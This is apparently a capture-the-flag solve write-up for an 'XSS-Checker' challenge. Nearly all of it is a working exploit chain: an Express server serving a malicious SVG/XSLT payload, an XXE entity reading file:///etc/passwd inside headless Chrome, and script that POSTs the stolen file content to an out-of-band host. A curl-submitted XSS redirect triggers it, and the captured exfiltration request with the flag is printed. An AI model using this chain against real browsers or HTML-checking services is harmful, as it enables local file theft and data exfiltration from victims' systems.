# XSS-Checker - Solve

https://bugs.chromium.org/p/chromium/issues/detail?id=1458911

> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.170 Safari/537.36

## Build the exploit

**app.js**
```javascript
const express = require('express');
const path = require('path');

const app = express();
const port = 9090;

app.get('/exploit', (req, res) => {
  res.sendFile(path.join(__dirname, 'exploit.svg'));
});

app.get('/xxe', (req, res) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.sendFile(path.join(__dirname, 'exploit.xsl'));
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
```

**exploit.xsl**

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE p [
<!ENTITY file SYSTEM "file:///etc/passwd">
]> 

<p>&file;</p>
```

**exploit.svg**

```xml
/DATA/XLST cat exploit.svg 
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="#"?>

<xsl:stylesheet id="color-change" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

 <xsl:template match="/">
	<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1000 1000">
		<script>
		const url = "https://cmfz2gt2vtc0000nwj30gk89tjayyyyyb.oast.fun"
        setTimeout(() => {
            const lfi = document.getElementById("lfi").innerHTML;
			fetch(url, { method: "POST", body: lfi})
        }, 50)
        </script>
        <foreignObject id="lfi" width="1000" height="1000">
		    <div style="font-size:xxx-large" xmlns="http://www.w3.org/1999/xhtml">
			<xsl:copy-of  select="document('xxe')"/>
		    </div>
		</foreignObject>
	</svg>
 </xsl:template>
</xsl:stylesheet>
```

Run the application

```bash
npm i express

node app.js
```

## Trigger the exploit

```bash
curl 'http://0.0.0.0:8000/xss-check' -X POST -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' --data-raw '{"html":"<script>document.location=\"https://xlst.i-will-pwn-your.host/exploit\"</script>"}'
```

```html
<script>document.location="https://xlst.i-will-pwn-your.host/exploit"</script>
```


### Out Of Band Server : 

```http
POST / HTTP/2.0
Host: cmfz2gt2vtc0000nwj30gk89tjayyyyyb.oast.fun
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Length: 118
Content-Type: text/plain;charset=UTF-8
Origin: https://xlst.i-will-pwn-your.host
Referer: https://xlst.i-will-pwn-your.host/
Sec-Ch-Ua: "Not/A)Brand";v="99", "HeadlessChrome";v="115", "Chromium";v="115"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.170 Safari/537.36

<div xmlns="http://www.w3.org/1999/xhtml" style="font-size:xxx-large"><p xmlns="">GH{XsS_T0_bR0wS3r_3xpl0it}</p></div>
```